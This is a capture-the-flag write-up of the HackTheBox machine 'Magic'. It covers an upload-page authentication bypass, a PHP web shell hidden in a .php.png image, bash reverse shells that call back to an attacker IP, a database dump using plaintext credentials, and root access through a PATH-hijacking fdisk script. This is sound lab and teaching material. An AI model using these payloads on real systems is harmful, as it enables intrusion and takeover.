# Magic [HTB](https://app.hackthebox.com/machines/241)
![magic-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/magic-01.png)


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 magic.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/ports-02.png)


Let's run a version detection scan againts these ports:

```bash
nmap -p 22,80 -sCV magic.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/nmap-res-03.png)

We have the following:

+ An SSH server on port 22.
+ An Apache/2.4.29 on port 80.


There are only two open services on the target with HTTP and SSH. Based on the nmap probing scripts we can probably guess that the target OS is Ubuntu. 


Let's check this Apache server.


### Apache Port 80

If we browse towards `http://magic.htb/` we see the following:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/site-04.png)


The site's main page has a gallery of images, each is named with what seems like a random string. If we click on an image it get's displayed in it's original size on the main page, without any changes to the url. At the buttom we see a message asking to login in order to upload images. 


I also intercepted a request in Burp to find any unusual or revealing HTTP headers and went over the source code, Though I didn't notice anything super useful. 


Before we go check this login page, I decided to run a directory and file scan:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://magic.htb/FUZZ -e .txt,.xml,.html,.php,.js
```

![ffuf-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/ffuf-05.png)


At first I decided to try and access `upload.php`, maybe we can access it without logging in? I wanted to see what the server will responde so I intercepted the request in Burp:

![request-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/request-06.png)


Although the server replied with a 302 status code, redirecting me towards `login.php`, there is HTML code in the response! I know from a previous box I solved that we can just change the 302 code to 200 in Burp, and our browser will render the page, completely bypassing the authintication:

![upload-page-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/upload-page-07.png)


Now that we have access to the file upload feature, We want to understand the logic of the application. Let's start by using the application in it's inteded use case and observe its behaviour. 


The site want's us to upload an image so I do just that. I use the following python script to quickly generate a valid PNG image with proper MIME type headers:

```python
from PIL import Image
img = Image.new('RGB', (320,320), color='black')
img.save('empty.png')
quit()
```


Now I upload the iamge to the site:

![upload-empty-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/upload-empty-08.png)


And if we check the main apge of the site again, we can see our uploaded black PNG image:

![uploaded-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/uploaded-09.png)


If we copy our files name, and search for it in the main page's source code we will find that it is linked towards `/images/uploads/empty.png`: 

![source-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/source-11.png)


If we navigate towards this directory we can access our image directly:

![access-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/access-12.png)


So we can access our uploaded images in the `/images/uploads/` directory by thier original name with no issue. The next step would be to find a way to upload a script that we can use to get a shell, the question is how good is the security of this file upload?


I start by creating a simple web-shell script with the php code below and named it `htb.php`:

```php
<?php system($_REQUEST['cmd']); ?>
```

I tried to upload this file to the server while capturing the response in Burp:

![err-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/err-13.png)


We get a message stating that only JPG, JPEG, and PNG files are allowed, which means there is probably a white-list check. I tested a lot of tricks to bypass the file extension filter but to no avail, so there must be other checks as well. 


My guess is there is also a MIME type check, I treid adding PNG MIME type headers to our php script using `hexeditor` but this didn't help. 


I spent quite a lot of time on this, testing different filenames, intercepting the responses from the server and studying it's behavior. After a while I concluded that the file extension check is pretty solid, we can't upload an image that doens't explicitly end with `.png`, `.jpeg`, or `.jpg`. 


But how can we get the server to treat our uploaded iamge as a php script if it ends with an image extension? 


There is a trick I know from a previous box I solved, that a possible misconfiguration of the Apache server can make it treat files that have the string `php` in thier name as php scripts, regardless of the actual extension. And since I've exhausted every other method out there to bypass the fileuplad, I decided to bet on this. 


To exploit this, we need to imbedd some php code inside an actual iamge. I used the image I created earlier and added code for a php web-shell inside of it and named the file `htb.php.png`:


![imbedd-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/embed-14.png)


If we upload this file and check the response we can see it's was a success:

![uploaded-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/itercept-15.png)


After the upload, I searched for the file in the gallery at the main page but I didn't see it. So I tried to accss it directly in `http://magic.htb/images/uploads/htb.php.png` which worked:

![text-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/text-16.png)


As you can see it diplays text. If the server was treating this as an image we would have recevied an error saying there is an issue with the image. Let's try to run a command:

![id-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/id-17.png)


It worked! Now it's a matter of finding a working payload to get a reverse shell. 


First, I start my local listner with:

```bash
rlwrap nc -lnvp 443
```

Then, after a bit of trail and error I found that the below payload works:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.54/443 0>&1"
```

I just use Burp's decoder to URL encode the payload and send it as the argument to the `cmd` parameter and I get a shell:

![shell-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/shell-18.png)


## Privilege Escalation


After getting a shell as the `www-data` user I spwan a TTY shell by running:

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

Then, I try to list any sudo permisisons but I get prompted for credentials. 


Instead I decided to have a look around the file system and that's where I see the following file:

![db-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/db-18.png)


In the file we can see credentials to a database:

![creds-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/creds-19.png)


If we list the contents of the `/home` directory we can see that `theseus` is the only user account on the system:

![home-dir-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/home-dir-20.png)


I tried to use `su` to get a shell as the user but without success. Then I tried to connect to the ssh with these credentials but they failed with the following error:

![ssh-fail-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/ssh-fail-21.png)


Looks like they want us to use `theseus` pulic key to connect. I had a look around `theseus`'s home folder because it is readable across the system, but I wasn't able to get access to the SSH key. 


So I decidced to try and connect to the database, but I came to find that `mysql` is not installed on the target:

![no-mysql-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/no-mysql-22.png)


So I decided to try and find any files on the target that have the string `mysql` in them:

```bash
find / -type f -name *mysql* 2>/dev/null
```

![find-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/find-23.png)


The output was quite large, but this entry was interesting, after a quick google search I came to find that we can use it to dump the contents of the database. We can de this with the following command:

```bash
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```

![dump-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/dump-24.png)


Here we see credentials, probably for the file uplaod we bypasswd earlier. Now when we run `su` to start a shell as `theseus` we are able to:

![theseus-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/theseus-25.png)


### Theseus


After I get a shell as `theseus` I go over he's home folder but I dont find anything super useful. I list any sudo permissions but we don't have any. 


So I decided to find any SUID binaries with:

```bash
find / -perm -4000 2>/dev/null
```

![suids-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/suids-26.png)


This binary looks unusual... If we list the permissions to the file we can see that only root and users in the `users` group can run this executable, and our user is a part of this group. 

![perms-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/perms-27.png)


If we run the file we get quite a long output of system information, though none of which is super useful. If we run `ltrace` we see something interesting:

![ltrace-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/ltrace-28.png)


We can see the program is executing the `fdisk` executable without specifiying a full path to the binary. We can create our own malicious variant `fdisk` script, and modify the PATH variable so that our `fdisk` get's executed first. 


I create the malicious `fdisk` variant in `/dev/shm` as such:

```bash
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.54/445 0>&1' > fdisk
chmod +x fdisk
```


Next, I modify the PATH variable:

```bash
export PATH="/dev/shm:$PATH"
```


Now I start my local listener with:

```bash
rlwrap nc -lnvp 445
```

And finally we can execute `sysinfo` on the target again, which stalls the shell once `sysinfo` invokes our `fdisk` script, at which point I get a shell:

![root-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Magic/img/root-29.png)
